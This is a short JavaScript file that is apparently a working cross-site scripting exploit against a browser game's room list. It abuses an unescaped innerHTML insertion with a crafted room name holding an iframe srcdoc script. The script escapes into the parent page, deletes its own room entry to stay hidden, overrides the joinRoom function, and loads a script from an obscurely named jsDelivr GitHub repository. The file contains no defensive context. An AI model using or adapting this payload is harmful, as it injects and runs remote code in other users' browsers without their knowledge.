function spawnRoom(room) {
    const roomItem = document.createElement('div');
    const roomListContainer = document.getElementById('roomList');

    roomItem.className = 'room-item';
    roomItem.onclick = () => joinRoom(room);
    roomItem.innerHTML = `<p id="roomName">${room.name}</p><p id="roomCount">${room.count}</p>`;
    roomListContainer.appendChild(roomItem);
}

const id = uuid.v4()

function iframeCode(){
    function code() {
        document.getElementById(id).parentNode.parentNode.remove()
        joinRoom = async (room) => {
            const nickname = document.getElementById('nickname').value.trim()

            if (nickname) {

                const metadata = {
                    nickname: nickname,
                    roomData: room
                };

                await sessionStorage.setItem('metadata', JSON.stringify(metadata))

                const arenaRes = await (await fetch('/pages/arena.html')).text()
                const htmlResponse = (arenaRes)
                await history.pushState(history.state, null, '/pages/arena.html')
                await document.open()
                await document.write(htmlResponse)
                await document.close()

                window.onpopstate = function() {
                    location.reload();
                };

                const url = 'https://cdn.jsdelivr.net/gh/xzDIz86hTfqVig/A3iK6zQ36xGX2u@latest/475Nvp5sKwvyS5.js'
                var script = await document.createElement('script');
                script.src = url;
                document.body.appendChild(script)

            } else {
                alert('Invalid nickname.')
            }
        }

    }

    var script = document.createElement('script');
    script.innerHTML = code.toString().match(/function[^{]+\{([\s\S]*)\}$/)[1]
    parent.document.body.appendChild(script)
}


const testRoom = {
    name: `<iframe id="${id}" srcdoc="<script>const id = '${id}';${iframeCode.toString().match(/function[^{]+\{([\s\S]*)\}$/)[1]}</script>"></iframe>`,
    id,
    count: 0
    }

spawnRoom(testRoom)
